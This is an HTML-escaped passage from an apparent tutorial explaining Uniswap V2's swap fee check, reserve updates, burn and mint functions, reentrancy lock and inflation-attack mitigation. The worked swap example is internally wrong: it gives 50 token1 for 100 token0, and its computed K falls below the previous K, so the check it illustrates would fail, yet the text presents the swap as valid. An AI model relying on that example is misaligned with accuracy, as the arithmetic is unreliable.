&lt;p&gt;Uniswap V2 doesn‚Äôt prevent you from &lt;strong&gt;‚Äúpaying too much&lt;&#x2F;strong&gt;‚Äù i.e. transferring in too many tokens in during the swap (this is related to one of the &lt;strong&gt;safety checks&lt;&#x2F;strong&gt;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;require&lt;&#x2F;code&gt; statement is reverts if the loss the of the pool(&lt;strong&gt;K&lt;&#x2F;strong&gt;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Accounting fot Fee&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;But not only do we want K to get larger, we want it to &lt;strong&gt;get larger by at least an amount that enforces the 0.3% fee&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Fee only applies to the tokens that go in, not on the tokens that go out.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Suppose we put in 1000 of token0 and remove 1000 of token1. We would need to pay a fee of 3 on token0 and no fee on token1.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Suppose we borrow 1000 of token0 and do not borrow token1. We are going to have to put 1000 of token0 back in, and we will have to pay a 0.3% fee on that ‚Äî 3 of token0.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Observe that if we &lt;strong&gt;flash borrow&lt;&#x2F;strong&gt; one of the tokens, it results in the &lt;strong&gt;same fee as swapping&lt;&#x2F;strong&gt; that token for the same amount. You pay &lt;strong&gt;fees on tokens in, not on tokens out&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;But if you don‚Äôt put tokens in, there is no way for you to borrow or swap.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;updating-reserves&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#updating-reserves&quot; aria-label=&quot;Anchor link for: updating-reserves&quot;&gt;Updating Reserves&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Now that the trade is completed, then the ‚Äú&lt;strong&gt;previous balance&lt;&#x2F;strong&gt;‚Äù must be replaced with the current balance. This happens in the call to the &lt;code&gt;_update()&lt;&#x2F;code&gt; function at the end of &lt;code&gt;swap()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_9.webp&quot;&gt;
&lt;p&gt;There is a lot of logic here to handle the &lt;strong&gt;TWAP oracle&lt;&#x2F;strong&gt;, but all we care about for now is lines &lt;strong&gt;82&lt;&#x2F;strong&gt; an &lt;strong&gt;83&lt;&#x2F;strong&gt; where the storage variables &lt;code&gt;reserve0&lt;&#x2F;code&gt; and &lt;code&gt;reserve1&lt;&#x2F;code&gt; are updated to reflect the changed balances. The arguments &lt;code&gt;_reserve0&lt;&#x2F;code&gt; and &lt;code&gt;_reserve1&lt;&#x2F;code&gt; are used to update the oracle, but they are not stored.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;safety-checks-in-swap&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#safety-checks-in-swap&quot; aria-label=&quot;Anchor link for: safety-checks-in-swap&quot;&gt;Safety Checks in Swap&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;There are two things that can go wrong:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;amountIn&lt;&#x2F;strong&gt; is not enforce to be optimal, so the user might &lt;strong&gt;overpay&lt;&#x2F;strong&gt; for the swap&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;AmountOut has no flexibility as it is supplied as a parameter argument. If the amountIn turns out to not be sufficient relative to amountOut, the transaction will revert and gas will be wasted.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;These circumstances can happen if someone &lt;strong&gt;frontruns&lt;&#x2F;strong&gt; a transaction (intentionally or not) and changes the ratio of assets in the pool in an undesirable direction.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Example on swap&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;- Swap Function: swap()
&lt;&#x2F;span&gt;&lt;span&gt;***********************
&lt;&#x2F;span&gt;&lt;span&gt;- The swap() function is used by traders to swap tokens
&lt;&#x2F;span&gt;&lt;span&gt;- The swap function ensures that the amount of token you are swapping to is greater than zero (It can be any of the tokens in the pair contract) : Only one of the tokens can have value greater than zero at a time.
&lt;&#x2F;span&gt;&lt;span&gt;- It also ensures that the amount of token you are swapping from and the amount of token you are swapping to is less than the available reserve: hence it will throw an INSUFFICIENT LIQUIDITY error.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- If this checks are passed, it checks which of the amount out (amount0Out or amount1Out) that is greater than zero, then it transfers the amount out to the trader optimistically.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- Note: without making sure that the trader has already transferred corresponding tokens into our balance. We can optimistically transfer tokens out because the swap function have assertions later in the function to check if we received corresponding tokens (the Periphery contract should send in the tokens to the pair contract before calling it for the swap). If the pair contract have not received any tokens, assertions will fail and Solidity will revert the entire function.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- The code: if (data.length &amp;gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
&lt;&#x2F;span&gt;&lt;span&gt;will inform the receiver about the swap if requested
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- Then it will check how many tokens was received by the pair contract.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- amount0In = balance0 &amp;gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0
&lt;&#x2F;span&gt;&lt;span&gt;- amount1In = balance1 &amp;gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Let&amp;#39;s assume:
&lt;&#x2F;span&gt;&lt;span&gt;- reserve0 = 1000
&lt;&#x2F;span&gt;&lt;span&gt;- reserve1 = 500
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;A user is swapping 100 token0
&lt;&#x2F;span&gt;&lt;span&gt;This means the user will get 50 token1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;token0 incoming = 100
&lt;&#x2F;span&gt;&lt;span&gt;token1 incoming = 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;token0 outgoing = 0
&lt;&#x2F;span&gt;&lt;span&gt;token1 outgoing = 50
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;At this point: 
&lt;&#x2F;span&gt;&lt;span&gt;balance0 = 1100
&lt;&#x2F;span&gt;&lt;span&gt;balance1 = 450
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Using this formula:
&lt;&#x2F;span&gt;&lt;span&gt;- amount0In = balance0 &amp;gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0
&lt;&#x2F;span&gt;&lt;span&gt;- amount1In = balance1 &amp;gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;amount0In = 1100 &amp;gt; 1000 - 0 ? 1100 - (1000 - 0) : 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;amount0In = 100
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;amount1In = 450 &amp;gt; 500 - 50 ? 450 - (500 - 50) : 0
&lt;&#x2F;span&gt;&lt;span&gt;amount1In = 0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- If the amountIn of either tokens of the pair contract is less than zero, it will revert with: INSUFFICIENT_INPUT_AMOUNT and the entire function will revert and nothing will have taken place.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- If the checks passes, then it proceeds to where the 0.3% fee paid by traders is calculated. It does this calculation to check and ensure that the fee was paid. Note the fee is also transferred to the pair contract and this is made possible by the Router contract.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- This is calculated by:
&lt;&#x2F;span&gt;&lt;span&gt;- balance0Adjusted = (balance0 * 1000) - (amount0In * 3)
&lt;&#x2F;span&gt;&lt;span&gt;- balance1Adjusted = (balance1 * 1000) - (amount1In * 3)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Remember:
&lt;&#x2F;span&gt;&lt;span&gt;balance0 = 1100
&lt;&#x2F;span&gt;&lt;span&gt;balance1 = 450
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- balance0Adjusted = (1100 * 1000) - (100 * 3)
&lt;&#x2F;span&gt;&lt;span&gt;- balance0Adjusted = 1100000 - 300
&lt;&#x2F;span&gt;&lt;span&gt;- balance0Adjusted = 1099700
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- balance1Adjusted = (450 * 1000) - (0 * 3)
&lt;&#x2F;span&gt;&lt;span&gt;- balance1Adjusted = 450000 - 0
&lt;&#x2F;span&gt;&lt;span&gt;- balance1Adjusted = 450000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- Then it checks if the k value (x*y=k) has decreased after the trade. The k value can never decrease because otherwise, Uniswap would lose from the swap.
&lt;&#x2F;span&gt;&lt;span&gt;**
&lt;&#x2F;span&gt;&lt;span&gt;require(balance0Adjusted.mul(balance1Adjusted) &amp;gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &amp;#39;UniswapV2: K&amp;#39;);
&lt;&#x2F;span&gt;&lt;span&gt;**
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Remember k = x*y
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;adjustedK = balance0Adjusted * balance1Adjusted
&lt;&#x2F;span&gt;&lt;span&gt;previousK = (_reserve0 * _reserve1) * 1000^2 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;adjustedK = 1099700 * 450000
&lt;&#x2F;span&gt;&lt;span&gt;adjustedK = 494865000000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;previousK = (1000 * 500) * 1000^2
&lt;&#x2F;span&gt;&lt;span&gt;previousK = 500000000000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;(The 1000^2 is because we multiplied balance0 and balance1 by 1000 when calculating the balance0Adjusted and balance1Adjusted)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- Finally, the _update() function is called to update the known reserves with the new balances and emit a Swap event.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;chapter-5-mint-and-burn-functions&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-5-mint-and-burn-functions&quot; aria-label=&quot;Anchor link for: chapter-5-mint-and-burn-functions&quot;&gt;&lt;strong&gt;Chapter - 5 : Mint and Burn Functions&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
Useful : &lt;a href=&quot;https:&#x2F;&#x2F;flow.com&#x2F;engineering-blogs&#x2F;uniswap-v2-explained-beginner-friendly&quot;&gt;&lt;strong&gt;https:&#x2F;&#x2F;flow.com&#x2F;engineering-blogs&#x2F;uniswap-v2-explained-beginner-friendly&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The lifecycle of Uniswap V2 is someone mints LP tokens (supplies liquidity, i.e. tokens to the pool) for the first time, then a second depositor mints liquidity, swaps happen, then eventually the liquidity providers burn their LP tokens to redeem the pool tokens.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;uniswap-v2-burn&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswap-v2-burn&quot; aria-label=&quot;Anchor link for: uniswap-v2-burn&quot;&gt;&lt;strong&gt;Uniswap V2 Burn&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Before liquidity tokens can be burned, there needs to be liquidity in the pool, so let‚Äôs make that assumption. We assume that there are two tokens in the system: token0 and token1.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter5_1.webp&quot;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;On line &lt;strong&gt;140&lt;&#x2F;strong&gt; (purple box), &lt;strong&gt;liquidity&lt;&#x2F;strong&gt; is measured by the amount of LP tokens owned by the pool contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;It is assumed that the burner sent in LP tokens before calling burn, but advisably as part of &lt;strong&gt;one transaction.&lt;&#x2F;strong&gt; (&lt;strong&gt;If they are sent as two transactions, someone else can burn your LP tokens and remove your liquidity!&lt;&#x2F;strong&gt;)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The amount the user sent to the contract will be burned. In general, we can assume that the contract will have zero balance of LP tokens, because if LP tokens are just sitting in the pair contract, someone will burn them and claim some of the token0 and token1 for free.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The red boxes on lines &lt;strong&gt;142&lt;&#x2F;strong&gt; and &lt;strong&gt;154&lt;&#x2F;strong&gt; denote &lt;strong&gt;fees&lt;&#x2F;strong&gt;, we will skip those for now as Uniswap does not apply fees to liquidity providers.&lt;&#x2F;p&gt;
&lt;p&gt;The orange boxes on lines &lt;strong&gt;144&lt;&#x2F;strong&gt; to &lt;strong&gt;145&lt;&#x2F;strong&gt; are where the amounts that the LP provider will get back are calculated. If the total supply of liquidity tokens is 1,000, and they burn 100 LP tokens, then they get 10% of the token0 and token1 held by the pool. Liquidity &#x2F; totalSupply is their burned share of the total supply of LP tokens.&lt;&#x2F;p&gt;
&lt;p&gt;The blue box on line &lt;strong&gt;147&lt;&#x2F;strong&gt; to &lt;strong&gt;149&lt;&#x2F;strong&gt; is where the &lt;strong&gt;LP tokens&lt;&#x2F;strong&gt; are actually &lt;strong&gt;burned&lt;&#x2F;strong&gt; and the token0 and token1 are sent to the liquidity provider.&lt;&#x2F;p&gt;
&lt;p&gt;The (yellow box) on lines &lt;strong&gt;150&lt;&#x2F;strong&gt;-&lt;strong&gt;151&lt;&#x2F;strong&gt; updates balance variables so that the call to &lt;code&gt;_update&lt;&#x2F;code&gt; on line &lt;strong&gt;153&lt;&#x2F;strong&gt; (green box) can update the &lt;code&gt;_reserve&lt;&#x2F;code&gt; variables. Aside from updating the &lt;strong&gt;TWAP&lt;&#x2F;strong&gt;, the &lt;code&gt;_update&lt;&#x2F;code&gt; function simply updates the &lt;code&gt;_reserve&lt;&#x2F;code&gt; variables.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter5_2.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;lock modifier&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The¬†&lt;code&gt;lock&lt;&#x2F;code&gt;¬†modifier prevents reentrancy attack by setting the initial value of¬†&lt;code&gt;unlocked&lt;&#x2F;code&gt;¬†state variable to 1. Once a function with¬†&lt;code&gt;lock&lt;&#x2F;code&gt;¬†modifier is executed, the¬†&lt;code&gt;unlocked&lt;&#x2F;code&gt;¬†state variable value will be set to 0. To reenter the contract, the¬†&lt;code&gt;unlocked&lt;&#x2F;code&gt;¬†state variable is required to be == 1, thus preventing reentrancy. The¬†&lt;code&gt;unlocked&lt;&#x2F;code&gt;¬†state variable value will return to 1 upon successful execution of the function or failed execution (reversion to original state). Uniswap applies the¬†&lt;code&gt;lock&lt;&#x2F;code&gt;¬†modifier to all the¬†&lt;em&gt;UniswapV2Pair&lt;&#x2F;em&gt;¬†functions that perform external calls, such as¬†&lt;code&gt;mint&lt;&#x2F;code&gt;,¬†&lt;code&gt;burn&lt;&#x2F;code&gt;,¬†&lt;code&gt;swap&lt;&#x2F;code&gt;¬†and¬†&lt;code&gt;skim&lt;&#x2F;code&gt;. Essentially this function modifier &lt;strong&gt;prevents 2 different parts&lt;&#x2F;strong&gt; of this contract to be executed simultaneously.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;safety-checks-in-burn&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#safety-checks-in-burn&quot; aria-label=&quot;Anchor link for: safety-checks-in-burn&quot;&gt;Safety checks in burn&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The amount of token0 and token1 that the liquidity provider gets depends on the ratio of the LP tokens they burn to the total supply of LP tokens. However, the totalSupply can change before the burn transaction is confirmed. This means that the contract interacting with burn needs to implement &lt;strong&gt;slippage checks.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Example burn&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;- Burn Function: burn()
&lt;&#x2F;span&gt;&lt;span&gt;***********************
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- The burn() function is the exact opposite of the mint() function
&lt;&#x2F;span&gt;&lt;span&gt;- The same gas saving mechanism is used just like in the mint() function
&lt;&#x2F;span&gt;&lt;span&gt;- balance0 and balance1 are total balances of the pair tokens in this pool
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- balance0 = IERC20(_token0).balanceOf(address(this))
&lt;&#x2F;span&gt;&lt;span&gt;- balance1 = IERC20(_token1).balanceOf(address(this))
&lt;&#x2F;span&gt;&lt;span&gt;- liquidity = balanceOf[address(this)];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- liquidity is the amount of pool ownership tokens that the liquidity provider (who wishes to cash out) has. 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;--- QUESTION ---
&lt;&#x2F;span&gt;&lt;span&gt;- But Why do we access the liquidity as the balance of address(this)? 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;--- ANSWER ---
&lt;&#x2F;span&gt;&lt;span&gt;- Because the liquidity was transferred to the Pair contract by the Periphery (Router) contract before calling the burn function.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- The amount of token to withdraw to the liquidity provider is proportional to the amount of Pool Ownership tokens (LP tokens) he has and this is calculated by:
&lt;&#x2F;span&gt;&lt;span&gt;- amount0 = (liquidity * balance0) &#x2F; totalSupply
&lt;&#x2F;span&gt;&lt;span&gt;- amount1 = (liquidity * balance1) &#x2F; totalSupply
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;- After the amount is calculated, the burn function is called, which burns the LP token of the liquidity provider that was transferred into the contract from the contract.
&lt;&#x2F;span&gt;&lt;span&gt;- Then it transfers the pair token the the liquidity provider used in providing liquidity. (This transfer also includes the accumulated rewards from traders fees over time)
&lt;&#x2F;span&gt;&lt;span&gt;- The _update() function is called again which updated the reserves(reserve0 and reserve1) with the new balance (balance0 and balance1) after the pair tokens (token0 and token1) + the rewards have been transferred to the liquidity provider that removed their liquidity.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;reserve0 = 1000
&lt;&#x2F;span&gt;&lt;span&gt;reserve1 = 500
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;balance0 = 1000
&lt;&#x2F;span&gt;&lt;span&gt;balance1 = 500
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;liquidity = 706
&lt;&#x2F;span&gt;&lt;span&gt;totalSupply = 1706
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;amount0 = liquidity.mul(balance0) &#x2F; _totalSupply;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;amount0 = (706 * 1000) &#x2F; 1706
&lt;&#x2F;span&gt;&lt;span&gt;amount0 = 706000 &#x2F; 1706
&lt;&#x2F;span&gt;&lt;span&gt;amount0 = 413.8335
&lt;&#x2F;span&gt;&lt;span&gt;amount0 = 413
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;amount1 = liquidity.mul(balance1) &#x2F; _totalSupply;
&lt;&#x2F;span&gt;&lt;span&gt;amount1 = (706 * 500) &#x2F; 1706
&lt;&#x2F;span&gt;&lt;span&gt;amount1 = 353000 &#x2F; 1706
&lt;&#x2F;span&gt;&lt;span&gt;amount1 = 206.91676
&lt;&#x2F;span&gt;&lt;span&gt;amount1 = 206
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;balance0 = 1000 - 413
&lt;&#x2F;span&gt;&lt;span&gt;balance0 = 587
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;balance1 = 500 - 206
&lt;&#x2F;span&gt;&lt;span&gt;balance1 = 294
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;reserve0 = 587
&lt;&#x2F;span&gt;&lt;span&gt;reserve1 = 294
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;kLast = 172578
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;uniswap-v2-mint&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#uniswap-v2-mint&quot; aria-label=&quot;Anchor link for: uniswap-v2-mint&quot;&gt;Uniswap V2 Mint&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Here is the mint liquidity function. Much of the functionality is similar to burn.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter5_3.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;Uniswap V2 mint function deals two different cases when minting liquidity.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Minting liquidity when the pool is not empty&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Minting initial liquidity. i.e, pool is empty&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;minting-liquidity-when-the-pool-is-not-empty&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#minting-liquidity-when-the-pool-is-not-empty&quot; aria-label=&quot;Anchor link for: minting-liquidity-when-the-pool-is-not-empty&quot;&gt;&lt;strong&gt;Minting liquidity when the pool is not empty&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The liquidity that is credited to the user, and later minted to them on line &lt;strong&gt;126&lt;&#x2F;strong&gt; (green box), is the lesser of two values.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter5_4.webp&quot;&gt;
&lt;p&gt;The ratio that line of code is measuring is amount0 &#x2F; _reserve0 ‚Äî scaled by the totalSupply of LP tokens.&lt;&#x2F;p&gt;
&lt;p&gt;Let‚Äôs say there are 10 token0 and 10 token1. If the user supplied 10 token0 and 0 token1 they will get the minimum of (10&#x2F;10, 0&#x2F;10) and get zero liquidity tokens back!&lt;&#x2F;p&gt;
&lt;p&gt;Another &lt;strong&gt;example&lt;&#x2F;strong&gt;: if they increase the supply of token0 by 5% and token1 by 10%, they will only get minted 5% of the supply of LP tokens (remember, this ratio is scaled by _totalSupply which is the current supply of LP tokens).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;The fact that the user will get the worse of the two ratios (amount0 &#x2F; _reserve0 or amount1 &#x2F; _reserve1) they provide incentivizes them to increase the supply of token0 and token1 without changing the ratio of token0 and token1.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;If the ratio is not the same as what the pool currently has, then there are always some tokens &lt;strong&gt;wasted&lt;&#x2F;strong&gt; in the sense that those tokens were added to the pool but no additional liquidity tokens were minted to the liquidity provider.&lt;&#x2F;p&gt;
&lt;p&gt;With this rule, the liquidity providers are incentivized to add tokens at the same ratio as the pool. And we know the rate is always close to the market price otherwise Arbitrageurs will arbitrage if the token ratio was off the market.&lt;&#x2F;p&gt;
&lt;p&gt;Why enforce this? Let‚Äôs say the pool currently has 100 of token0 and 1 of token1, and the supply of LP tokens is 1. Let‚Äôs say the total value, in dollars, of both tokens is $100 each, so the total value of the pool is $200.&lt;&#x2F;p&gt;
&lt;p&gt;If we took the &lt;em&gt;&lt;strong&gt;maximum&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt; of the two ratios, someone could supply one additional token1 (at a cost of $100) and raise the pool value to $300. They‚Äôve increase the pool value by 50%. However, under the maximum calculation, they would get minted 1 LP tokens, meaning they own 50% of the supply of the LP tokens, since the total circulating supply is now 2 LP tokens. Now they control 50% of the $300 pool (worth $150) by only depositing $100 of value. This is clearly stealing from other LP providers.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Supply Ratio Safety Check&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The user might try to respect the token ratios, but if another transaction executes in front of them and changes the balance of token 0 to token 1, then they will get fewer liquidity tokens back than they expected.&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap doesn&#x27;t require exact amounts because otherwise the transaction would likely revert. Another transaction executed first would change the requirement between when the minter sent the transaction and when it was included in the block.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;TotalSupply safety check&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Just like the burn case, the totalSupply of LP tokens could change at the time, so some slippage protection must be implemented.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;minting-liquidity-when-the-pool-is-empty-first-minting&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#minting-liquidity-when-the-pool-is-empty-first-minting&quot; aria-label=&quot;Anchor link for: minting-liquidity-when-the-pool-is-empty-first-minting&quot;&gt;&lt;strong&gt;Minting liquidity when the pool is empty (First Minting)&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Uniswap uses a special case when minting for the first time in pool to mitigate the &lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;tienshaoku.medium.com&#x2F;eip-4626-inflation-sandwich-attack-deep-dive-and-how-to-solve-it-9e3e320cc3f1&quot;&gt;inflation attack&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt; by using the &lt;strong&gt;MINIMUM_LIQUIDITY.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is locked by sending the Mininum Liquidity to address(0) : Once this is done, the &lt;strong&gt;total supply can never be reduced&lt;&#x2F;strong&gt; to zero again even if the liquidity providers remove their liquidity from the pool. A brand new pool needs to lock in MINIMUM_LIQUIDITY amount of pool ownership (LP) token to avoid division by zero in the liquidity calculations.&lt;&#x2F;p&gt;
